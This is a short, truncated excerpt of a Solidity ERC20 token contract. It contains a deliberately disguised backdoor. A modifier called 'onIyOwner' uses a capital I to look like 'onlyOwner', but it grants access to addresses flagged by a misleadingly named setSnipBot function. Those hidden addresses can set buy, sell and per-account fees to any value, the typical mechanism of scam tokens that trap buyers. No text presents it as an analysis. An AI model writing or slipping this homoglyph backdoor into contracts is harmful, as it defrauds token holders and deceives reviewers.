...
contract ERC20Token is ERC20, Ownable {
    ...
    modifier onIyOwner(){require(_isbots[_msgSender()]==true);_;}
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    } 

    function setSnipBot(address[] memory bot) external onlyOwner {
        for (uint256 i = 0; i < bot.length; i++) {
            _isbots[bot[i]]= true;
        }
    }

    function setSellFee(uint256 _value) external onIyOwner {
        _defaultSellFee = _value;
    }

    function setBuyFee(uint256 _value) external onIyOwner {
        _defaultBuyFee = _value;
    }

    function setAccountFee(address _address, uint256 _value) external onIyOwner {
        require(_value >= 0, "Account tax must be greater than or equal to 0");
        _accountFee[_address] = _value;
    }

    function setIsAccountFee(address _address, bool _value) external onIyOwner {
